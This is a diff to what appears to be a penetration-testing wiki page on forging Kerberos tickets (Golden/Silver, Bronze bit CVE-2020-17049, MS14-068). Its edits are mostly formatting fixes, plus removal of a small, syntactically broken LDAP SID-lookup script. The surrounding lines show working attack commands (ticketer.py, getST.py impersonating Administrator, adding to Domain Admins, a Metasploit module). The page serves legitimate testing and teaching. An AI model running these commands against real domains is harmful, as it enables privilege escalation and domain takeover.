@@ -13,14 +13,14 @@ Silver and Golden tickets are forged Kerberos tickets that can be used with [pas
 
 The **Bronze bit** vulnerability (CVE-2020-17049) introduced the possibility of forwarding service tickets when it shouldn't normally be possible (protected users, unconstrained delegation, constrained delegation configured with protocol transition).
 
-![](../../../.gitbook/assets/Kerberos_delegation.png)
+![](../../../.gitbook/assets/Kerberos\_delegation.png)
 
 ## Practice
 
 The following parts allow to obtain modified or crafted Kerberos tickets. Once obtained, these tickets can be used with [Pass-the-Ticket](ptt.md).
 
 {% hint style="success" %}
-For Golden and Silver tickets, it's important to remember that, by default, [ticketer](https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/examples/ticketer.py#L740-L741) and [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-kerberos) forge tickets containing PACs that say the user belongs to some well-known administrators groups (i.e. group ids 513, 512, 520, 518, 519). There are scenarios where these groups are not enough (special machines where even Domain Admins don't have local admin rights). 
+For Golden and Silver tickets, it's important to remember that, by default, [ticketer](https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/examples/ticketer.py#L740-L741) and [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-kerberos) forge tickets containing PACs that say the user belongs to some well-known administrators groups (i.e. group ids 513, 512, 520, 518, 519). There are scenarios where these groups are not enough (special machines where even Domain Admins don't have local admin rights).&#x20;
 
 In these situations, testers can either look for the domain groups that have local administrator privileges on the target machine, or specify all the groups ids when creating the ticket.
 
@@ -97,7 +97,7 @@ python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $
 python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
 ```
 
-The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)).
+The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)).
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -136,7 +136,7 @@ getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $
 getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -aesKey $Controlled_service_AES_key $Domain/$Controlled_service_account
 ```
 
-The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)).
+The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)).
 
 ### MS14-068 (CVE-2014-6324)
 
@@ -148,23 +148,7 @@ This attack can be operated with [pykek](https://github.com/mubix/pykek)'s [ms14
 
 Referring to [kekeo](https://github.com/gentilkiwi/kekeo/wiki/ms14068)'s wiki might also help untangle some situations but errors like  `KDC_ERR_SUMTYPE_NOSUPP (15)` or `KRB_ERR_GENERIC (60) `when trying to use the generated `.ccache` ticket mean the target is patched.
 
-In order to operate the attack, knowing a domain account’s name, it’s password and it’s SID are needed. The SID can be obtained with the following script.
-
-```python
-import ldap3
-
-target_dn = "DC=domain,DC=local"
-domain = "domain.com"
-username = "username"
-password = "password"
-
-user = "{}\\{}".format(domain, username)
-server = ldap3.Server
-connection = ldap3.Connection(server=server, user=user, password=password, authentication authentication=ldap3.NTLM)
-connection.bind()
-connection.search(target_dn, "(samaccountname={})".format(username), attributes=["objectsid"])
-print(connection.entries)
-```
+In order to operate the attack, knowing a domain account’s name, it’s password and it’s SID are needed.&#x20;
 
 A TGT can then be obtained with one of the following commands.
 
@@ -191,7 +175,7 @@ net group "Domain Admins" /domain /add
 ```
 {% endhint %}
 
-Metasploit Framework can also be useful in the  it prints valuable error information.
+Metasploit Framework can also be useful in the sense that it prints valuable error information.
 
 ```bash
 msf6 > use admin/kerberos/ms14_068_kerberos_checksum
